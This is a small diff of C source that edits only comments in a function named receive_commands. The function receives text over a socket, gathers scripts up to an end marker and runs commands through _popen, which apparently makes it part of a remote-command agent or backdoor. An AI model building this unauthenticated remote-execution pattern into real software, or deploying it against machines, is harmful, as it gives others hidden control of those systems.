@@ -87,7 +87,7 @@ void receive_commands(SOCKET client_socket) {
                 if (bytes_received <= 0) break;  
                 buffer[bytes_received] = '\0'; 
                 if (strstr(buffer, "SCRIPT_END") != NULL) { 
-                    strncat(script, buffer, bytes_received - strlen("SCRIPT_END"));  /
+                    strncat(script, buffer, bytes_received - strlen("SCRIPT_END")); 
                     break;  
                 }
                 strncat(script, buffer, bytes_received);  
@@ -101,7 +101,7 @@ void receive_commands(SOCKET client_socket) {
         FILE *fp = _popen(buffer, "r");
         if (fp) {  
             while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {  
-                strncat(command_buffer, buffer, sizeof(command_buffer) - strlen(command_buffer) - 1);  // Append to command output
+                strncat(command_buffer, buffer, sizeof(command_buffer) - strlen(command_buffer) - 1);
             }
             _pclose(fp);
         } else {
